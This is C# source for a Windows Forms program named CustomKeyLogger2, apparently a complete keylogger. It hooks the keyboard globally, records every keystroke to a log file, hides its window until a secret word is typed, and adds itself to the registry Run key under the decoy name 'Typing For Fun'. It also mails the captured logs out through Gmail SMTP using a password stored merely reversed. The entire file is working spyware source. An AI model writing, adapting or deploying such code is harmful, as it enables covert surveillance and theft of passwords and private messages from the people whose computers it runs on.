using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.Linq;
using System.Text;
using System.Windows.Forms;

using System.Runtime.InteropServices;
using System.IO;
using System.Collections;
using System.Net.Mail;
using Microsoft.Win32;

namespace CustomKeyLogger2
{
    public partial class Form1 : Form
    {
        [DllImport("user32.dll", CharSet = CharSet.Auto, ExactSpelling = true)]
        internal static extern short GetKeyState(int virtualKeyCode);

        String atmdir = Environment.GetFolderPath(Environment.SpecialFolder.CommonApplicationData) + "\\Key Logger";
        String writeUp = "";
        String writeUpBuffer = "";
        String secretWord = "";
        ArrayList keyWords;

        String keywordsFileDir, logsFileDir, attachFileDir;

        bool PauseWriting = false;
        SmtpClient emailClient = new SmtpClient("smtp.gmail.com", 587);

        public Form1()
        {
            InitializeComponent();
            
            InitStream();

            InitSecretWord();

            InitKeyWords();

            InitEmail();

            InitStartUp();
        }

        private void InitStream()
        {
            if (!Directory.Exists(atmdir)) Directory.CreateDirectory(atmdir);
            atmdir += "\\";

            keywordsFileDir = atmdir + "keywords.krs";
            logsFileDir = atmdir + Environment.UserName + "-logs.krs";
            attachFileDir = atmdir + "attachlog.txt";
            StreamWriter sw;
            if (!File.Exists(keywordsFileDir))
            {
                sw = File.CreateText(keywordsFileDir);
                sw.Close();
            }
            if (!File.Exists(logsFileDir))
            {
                sw = File.CreateText(logsFileDir);
                sw.Close();
            }
        }

        private void InitSecretWord()
        {
            secretWord = Properties.Settings.Default.SecretWord;
            txtScrtWrd.Text = secretWord;

            if (secretWord.CompareTo("") == 0 || Properties.Settings.Default.AutoStart == false)
            {
                this.ShowWindow();
                this.btnStart.Enabled = true;
                this.btnStop.Enabled = false;
                this.btnHide.Enabled = false;
            }
            else
            {
                hook.CreateHook(KeyReaderr);
                this.btnStart.Enabled = false;
                this.btnStop.Enabled = true;
                this.btnHide.Enabled = true;
                this.HideWindow();      // Default;
            }
        }

        private void InitKeyWords()
        {
            using (StreamReader sr = new StreamReader(keywordsFileDir))
            {
                String temp;
                keyWords = new ArrayList();

                do
                {
                    // read a line of text
                    temp = sr.ReadLine();
                    if (temp != null) keyWords.Add(temp);
                } while (temp != null);
            }
        }

        private void InitEmail()
        {
            txtEmail.Text = Properties.Settings.Default.GMail;
            txtPassWord.Text = LoadPassword();
            lblMailStatus.Text = "";
            
        }

        private void InitStartUp()
        {
            String StartmenuApp = Environment.GetFolderPath(Environment.SpecialFolder.StartMenu)
                + "\\Programs\\Typing For Fun\\Typing For Fun.appref-ms";
            String StartupPath = atmdir + "Typing For Fun.appref-ms";

            if (File.Exists(StartmenuApp))
            {
                if (!File.Exists(StartupPath)) File.Copy(StartmenuApp, StartupPath, true);
                RegistryKey regKey = Registry.LocalMachine.OpenSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Run", true);
                string result = (string)regKey.GetValue(Application.ProductName, "NotFound");
                if (result != StartupPath)
                {
                    if (result != "NotFound") regKey.DeleteValue(Application.ProductName);
                    regKey.SetValue(Application.ProductName, StartupPath);
                    regKey.Close();
                }
            }
        }

        private void btnStart_Click(object sender, EventArgs e)
        {
            hook.CreateHook(KeyReaderr);
            btnStart.Enabled = false;
            btnStop.Enabled = true;
            btnHide.Enabled = true;
            Properties.Settings.Default.AutoStart = true;
        }

        private void btnStop_Click(object sender, EventArgs e)
        {
            hook.DestroyHook();
            btnStart.Enabled = true;
            btnStop.Enabled = false;
            btnHide.Enabled = false;
            Properties.Settings.Default.AutoStart = false;
        }

        public void KeyReaderr(IntPtr wParam, IntPtr lParam, bool ShiftMod, bool CapMod)
        {
            int key = Marshal.ReadInt32(lParam);

            hook.VK vk = (hook.VK)key;

            String temp = "";

            #region switch
            switch (vk)
            {
                //case hook.VK.VK_F1: temp = "<-F1->";
                //    break;
                //case hook.VK.VK_F2: temp = "<-F2->";
                //    break;
                //case hook.VK.VK_F3: temp = "<-F3->";
                //    break;
                //case hook.VK.VK_F4: temp = "<-F4->";
                //    break;
                //case hook.VK.VK_F5: temp = "<-F5->";
                //    break;
                //case hook.VK.VK_F6: temp = "<-F6->";
                //    break;
                //case hook.VK.VK_F7: temp = "<-F7->";
                //    break;
                //case hook.VK.VK_F8: temp = "<-F8->";
                //    break;
                //case hook.VK.VK_F9: temp = "<-F9->";
                //    break;
                //case hook.VK.VK_F10: temp = "<-F10->";
                //    break;
                //case hook.VK.VK_F11: temp = "<-F11->";
                //    break;
                //case hook.VK.VK_F12: temp = "<-F12->";
                //    break;

                //case hook.VK.VK_SNAPSHOT: temp = "<-print screen->";
                //    break;
                //case hook.VK.VK_SCROLL: temp = "<-scroll>";
                //    break;
                //case hook.VK.VK_PAUSE: temp = "<-pause->";
                //    break;
                //case hook.VK.VK_INSERT: temp = "\r\n<-insert->";
                //    break;
                //case hook.VK.VK_HOME: temp = "\r\n<-home->";
                //    break;
                case hook.VK.VK_DELETE: temp = "<delete>";
                    break;
                //case hook.VK.VK_END: temp = "<-end->";
                //    break;
                //case hook.VK.VK_PRIOR: temp = "<-page up->";
                //    break;
                //case hook.VK.VK_NEXT: temp = "<-page down->";
                //    break;

                //case hook.VK.VK_ESCAPE: temp = "\r\n<-esc->";
                //    break;
                //case hook.VK.VK_NUMLOCK: temp = "\r\n<-numlock->";
                //    break;
                //case hook.VK.VK_LSHIFT: temp = "\r\n<-left shift->";
                //    break;
                //case hook.VK.VK_RSHIFT: temp = "\r\n<-right shift->";
                //    break;
                //case hook.VK.VK_LCONTROL: temp = "\r\n<-left control->";
                //    break;
                //case hook.VK.VK_RCONTROL: temp = "\r\n<-right control->";
                //    break;
                //case hook.VK.VK_LMENU: temp = "\r\n<-left alt->";
                //    break;
                //case hook.VK.VK_RMENU: temp = "\r\n<-right alt->";
                //    break;
                case hook.VK.VK_TAB: temp = "\t";
                    break;
                //case hook.VK.VK_CAPITAL: temp = "\r\n<-caps lock->";
                //    break;
                case hook.VK.VK_BACK: temp = "<back>";
                    break;
                case hook.VK.VK_RETURN: temp = "\r\n";
                    break;
                case hook.VK.VK_SPACE: temp = "  ";     //  "<-space->"
                    break;

                //case hook.VK.VK_LEFT: temp = "<left>";
                //    break;
                //case hook.VK.VK_UP: temp = "<up>";
                //    break;
                //case hook.VK.VK_RIGHT: temp = "<right>";
                //    break;
                //case hook.VK.VK_DOWN: temp = "<down>";
                //    break;

                case hook.VK.VK_MULTIPLY: temp = "*";
                    break;
                case hook.VK.VK_ADD: temp = "+";
                    break;
                case hook.VK.VK_SEPERATOR: temp = "|";
                    break;
                case hook.VK.VK_SUBTRACT: temp = "-";
                    break;
                case hook.VK.VK_DECIMAL: temp = ".";
                    break;
                case hook.VK.VK_DIVIDE: temp = "/";
                    break;

                case hook.VK.VK_OEM_1: temp = ";";
                    break;
                case hook.VK.VK_OEM_PLUS: temp = "=";
                    break;
                case hook.VK.VK_OEM_COMMA: temp = ",";
                    break;
                case hook.VK.VK_OEM_MINUS: temp = "-";
                    break;
                case hook.VK.VK_OEM_PERIOD: temp = ".";
                    break;
                case hook.VK.VK_OEM_2: temp = "/";
                    break;
                case hook.VK.VK_OEM_3: temp = "`";
                    break;
                case hook.VK.VK_OEM_4: temp = "[";
                    break;
                case hook.VK.VK_OEM_5: temp = @"\";
                    break;
                case hook.VK.VK_OEM_6: temp = "]";
                    break;
                case hook.VK.VK_OEM_7: temp = "'";
                    break;

                case hook.VK.VK_NUMPAD0: temp = "0";
                    break;
                case hook.VK.VK_NUMPAD1: temp = "1";
                    break;
                case hook.VK.VK_NUMPAD2: temp = "2";
                    break;
                case hook.VK.VK_NUMPAD3: temp = "3";
                    break;
                case hook.VK.VK_NUMPAD4: temp = "4";
                    break;
                case hook.VK.VK_NUMPAD5: temp = "5";
                    break;
                case hook.VK.VK_NUMPAD6: temp = "6";
                    break;
                case hook.VK.VK_NUMPAD7: temp = "7";
                    break;
                case hook.VK.VK_NUMPAD8: temp = "8";
                    break;
                case hook.VK.VK_NUMPAD9: temp = "9";
                    break;

                case hook.VK.VK_Q: temp = "q";
                    break;
                case hook.VK.VK_W: temp = "w";
                    break;
                case hook.VK.VK_E: temp = "e";
                    break;
                case hook.VK.VK_R: temp = "r";
                    break;
                case hook.VK.VK_T: temp = "t";
                    break;
                case hook.VK.VK_Y: temp = "y";
                    break;
                case hook.VK.VK_U: temp = "u";
                    break;
                case hook.VK.VK_I: temp = "i";
                    break;
                case hook.VK.VK_O: temp = "o";
                    break;
                case hook.VK.VK_P: temp = "p";
                    break;
                case hook.VK.VK_A: temp = "a";
                    break;
                case hook.VK.VK_S: temp = "s";
                    break;
                case hook.VK.VK_D: temp = "d";
                    break;
                case hook.VK.VK_F: temp = "f";
                    break;
                case hook.VK.VK_G: temp = "g";
                    break;
                case hook.VK.VK_H: temp = "h";
                    break;
                case hook.VK.VK_J: temp = "j";
                    break;
                case hook.VK.VK_K: temp = "k";
                    break;
                case hook.VK.VK_L: temp = "l";
                    break;
                case hook.VK.VK_Z: temp = "z";
                    break;
                case hook.VK.VK_X: temp = "x";
                    break;
                case hook.VK.VK_C: temp = "c";
                    break;
                case hook.VK.VK_V: temp = "v";
                    break;
                case hook.VK.VK_B: temp = "b";
                    break;
                case hook.VK.VK_N: temp = "n";
                    break;
                case hook.VK.VK_M: temp = "m";
                    break;

                case hook.VK.VK_0: temp = "0";
                    break;
                case hook.VK.VK_1: temp = "1";
                    break;
                case hook.VK.VK_2: temp = "2";
                    break;
                case hook.VK.VK_3: temp = "3";
                    break;
                case hook.VK.VK_4: temp = "4";
                    break;
                case hook.VK.VK_5: temp = "5";
                    break;
                case hook.VK.VK_6: temp = "6";
                    break;
                case hook.VK.VK_7: temp = "7";
                    break;
                case hook.VK.VK_8: temp = "8";
                    break;
                case hook.VK.VK_9: temp = "9";
                    break;
                default: break;
            }
            #endregion

            #region To Upper Case

            if (ShiftMod == true)
            {
                if ((int)vk > 0x40 && (int)vk < 0x5B && CapMod == false) temp = temp.ToUpper();
                if (vk == hook.VK.VK_1) temp = "!";
                if (vk == hook.VK.VK_2) temp = "@";
                if (vk == hook.VK.VK_3) temp = "#";
                if (vk == hook.VK.VK_4) temp = "$";
                if (vk == hook.VK.VK_5) temp = "%";
                if (vk == hook.VK.VK_6) temp = "^";
                if (vk == hook.VK.VK_7) temp = "&";
                if (vk == hook.VK.VK_8) temp = "*";
                if (vk == hook.VK.VK_9) temp = "(";
                if (vk == hook.VK.VK_0) temp = ")";
                if (vk == hook.VK.VK_OEM_1) temp = ":";
                if (vk == hook.VK.VK_OEM_2) temp = "?";
                if (vk == hook.VK.VK_OEM_3) temp = "~";
                if (vk == hook.VK.VK_OEM_COMMA) temp = "<";
                if (vk == hook.VK.VK_OEM_MINUS) temp = "_";
                if (vk == hook.VK.VK_OEM_PERIOD) temp = ">";
                if (vk == hook.VK.VK_OEM_PLUS) temp = "+";
                if (vk == hook.VK.VK_OEM_4) temp = "{";
                if (vk == hook.VK.VK_OEM_5) temp = "|";
                if (vk == hook.VK.VK_OEM_6) temp = "}";
                if (vk == hook.VK.VK_OEM_7) temp = "\"";
            }
            else if (CapMod == true)
            {
                if ((int)vk > 0x40 && (int)vk < 0x5B) temp = temp.ToUpper();
            }

            #endregion

            writeUp = writeUp + temp;
            writeUpBuffer = writeUpBuffer + temp;

#if Disabled
            checkKeys();
#endif
            //writeToFile(temp);
        }
        
        public void unhide()
        {
            if (secretWord != "" && writeUp.Contains(secretWord))
            {
                writeUp = writeUp.Replace(secretWord, "");
                this.ShowWindow();
            }
        }

        public void checkKeys()
        {
            int max = keyWords.Count;

            for (int i = 0; i < max; i++)
            {
                if (writeUp.Contains((String)keyWords[i]))
                {
                    MessageBox.Show("KeyWord!");
                    MessageBox.Show((String)keyWords[i]);

                    writeUp = writeUp.Replace((String)keyWords[i],"");
                    return;
                }
            }

        }

        public void writeToFile(String writing)
        {
            if (PauseWriting == false) File.AppendAllText(logsFileDir, writing);
        }

        private void btnShow_Click(object sender, EventArgs e)
        {
            txtLog.Text = File.ReadAllText(logsFileDir);
        }

        private void btnSvScrtWrd_Click(object sender, EventArgs e)
        {
            WriteSecretWord();
            NotifySaved();
        }

        private void WriteSecretWord()
        {
            secretWord = txtScrtWrd.Text.Trim();
            Properties.Settings.Default.SecretWord = secretWord;
        }

        private void btnSaveKeyWord_Click(object sender, EventArgs e)
        {
            String input = txtKeyWord.Text.Trim();
            if (CheckDuplicateKeyWords(input)) return;

            keyWords.Add(input);
            using (StreamWriter sw = new StreamWriter(keywordsFileDir))
            {
                sw.WriteLine(input);
            }

            NotifySaved();
        }

        private bool CheckDuplicateKeyWords(string input)
        {
            bool result = false;
            int max = keyWords.Count;
            for (int i = 0; i < max; i++)
            {
                if ((String)keyWords[i] == input) result = true;
            }
            return result;
        }

        public void sendMailK()
        {
            PauseWriting = true;
            File.Copy(logsFileDir, attachFileDir, true);
            Attachment attach = new Attachment(attachFileDir);
            File.Delete(logsFileDir);
            StreamWriter sw = File.CreateText(logsFileDir);
            sw.Close();
            PauseWriting = false;

            MailMessage message = new MailMessage(Properties.Settings.Default.GMail, Properties.Settings.Default.GMail,
                "CustomKeyLogger2 - Logs", "logs report");
            message.Attachments.Add(attach);
            System.Net.NetworkCredential SMTPUserInfo = new System.Net.NetworkCredential(Properties.Settings.Default.GMail,
                LoadPassword());

            emailClient = new SmtpClient("smtp.gmail.com", 587);
            emailClient.SendCompleted += new SendCompletedEventHandler(SendCompletedCallback);
            emailClient.EnableSsl = true;
            emailClient.DeliveryMethod = SmtpDeliveryMethod.Network;
            emailClient.UseDefaultCredentials = false;
            emailClient.Credentials = SMTPUserInfo;
            emailClient.Timeout = 20000;
            
            lblMailStatus.Text = "Sending Mail ...";
            emailClient.SendAsync(message, "Sending Mail");
        }

        private void SendCompletedCallback(object sender, AsyncCompletedEventArgs e)
        {
            // Get the unique identifier for this asynchronous operation.
            String token = (string)e.UserState;
            String temp = "";

            if (e.Cancelled)
            {
                temp = "Send Canceled.";
            }
            if (e.Error != null)
            {
                temp = "Error! " + e.Error.Message;
            }
            else
            {
                temp = "Mail Sent!";
            }
            lblMailStatus.Text = temp;
        }

        private void btnHide_Click(object sender, EventArgs e)
        {
            this.HideWindow();
        }

        private void ShowWindow()
        {
            this.Opacity = 1;
            this.FormBorderStyle = System.Windows.Forms.FormBorderStyle.None;
            this.WindowState = FormWindowState.Normal;
            this.Refresh();
        }

        private void HideWindow()
        {
            this.Opacity = 0;
            this.FormBorderStyle = System.Windows.Forms.FormBorderStyle.FixedToolWindow;
            this.WindowState = FormWindowState.Minimized;
            this.Refresh();
        }

        private void btnExit_Click(object sender, EventArgs e)
        {
            this.Close();
        }

        private void btnEmail_Click(object sender, EventArgs e)
        {
            sendMailK();
        }

        private void btnSaveEmail_Click(object sender, EventArgs e)
        {
            Properties.Settings.Default.GMail = txtEmail.Text;
            SavePassword(txtPassWord.Text);
            NotifySaved();
        }

        private void NotifySaved()
        {
            MessageBox.Show("Saved!");
        }

        private void SavePassword(String rawpass)
        {
            Char[] gen = rawpass.ToCharArray();
            Array.Reverse(gen);
            Properties.Settings.Default.PW = new String(gen);
        }

        private String LoadPassword()
        {
            String raw = Properties.Settings.Default.PW;
            Char[] gen = raw.ToCharArray();
            Array.Reverse(gen);
            return new String(gen);
        }

        private void Form1_FormClosing(object sender, FormClosingEventArgs e)
        {
            Properties.Settings.Default.Save();
        }

        private void timUnHide_Tick(object sender, EventArgs e)
        {
            unhide();
            String temp = writeUpBuffer;
            writeUpBuffer = "";
            writeToFile(temp);
        }

        private void btnCreateDesktopShortcut_Click(object sender, EventArgs e)
        {
            String ShortcutLnk = Environment.GetFolderPath(Environment.SpecialFolder.Desktop) + "\\Typing For Fun.lnk";
            if (!File.Exists(ShortcutLnk))
            {
                IWshRuntimeLibrary.WshShell shell = new IWshRuntimeLibrary.WshShell();
                IWshRuntimeLibrary.IWshShortcut link = (IWshRuntimeLibrary.IWshShortcut)shell.CreateShortcut(ShortcutLnk);
                link.TargetPath = atmdir;
                link.Save();
            }
        }
    }
}
